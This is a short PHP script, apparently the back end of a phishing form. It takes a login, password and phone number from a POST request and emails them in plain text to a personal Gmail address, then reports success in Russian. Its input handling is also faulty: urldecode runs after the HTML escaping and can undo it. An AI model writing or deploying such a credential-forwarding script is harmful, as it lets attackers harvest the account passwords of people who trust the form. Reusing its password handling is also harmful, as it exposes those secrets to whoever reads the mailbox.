<?php



    $login = $_POST['login'];
	$tel = $_POST['tel'];
	$pass = $_POST['pass'];


    $login = htmlspecialchars($login);  // Преобразование символов в сущность
	$tel = htmlspecialchars($tel);
	$pass = htmlspecialchars($pass);


	$login =urldecode($login);   // декодирование URL
	$tel =urldecode($tel);
	$pass =urldecode($pass);


	$login = trim($login);    // удоляет пробелов 
	$tel = trim($tel);
	$pass = trim($pass);




    if (mail("ognyova99@gmail.com",
	         "Новое письмо сайта",
			 "логин: " .$login."\n". 
			 "Пароль: " .$pass. "\n".
			 "Телефон: " .$tel, 
			 "from: no-reply")
	){
		echo ('Письмо успешно отправлено!');
	}

	else {
        echo('Есть ошибки');
	}



?>